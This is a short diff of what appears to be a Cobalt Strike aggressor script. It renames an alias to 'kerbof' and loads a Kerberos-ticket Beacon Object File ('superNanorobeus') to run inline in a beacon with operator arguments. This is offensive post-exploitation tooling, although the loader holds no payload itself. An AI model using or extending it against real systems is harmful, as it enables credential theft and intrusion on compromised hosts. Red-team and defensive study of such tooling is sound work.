@@ -1,31 +1,17 @@
-alias super {
+alias kerbof {
     local('$handle $data $args $klist $klist_all');
     
     # read in the right BOF file
     $handle = openf(script_resource("superNanorobeus.x64.o"));
     $data   = readb($handle, -1);
     closef($handle);
-
-#     # default args
-#     $klist = "";
-#     $klist_all = "";
-#     
-#     for ($i = 1; $i < size(@_); $i++) {
-#         if (@_[$i] eq "klist") {
-#             # use klist
-#             $klist = 1;
-#         }
-#         else if (@_[$i] eq "klist /all") {
-#             # use klist /all
-#             $klist_all = 1;
-#         }
     
     # pack our arguments
     #$args   = bof_pack($1, "zz", "klist", "/all");
     $args   = bof_pack($1, "zzz", $2, $3, $4);
     
     # announce what we're doing
-    btask($1, "Running superNanorobeus BOF");
+    btask($1, "Running KerBOF");
     
     # execute it.
     beacon_inline_execute($1, $data, "go", $args);
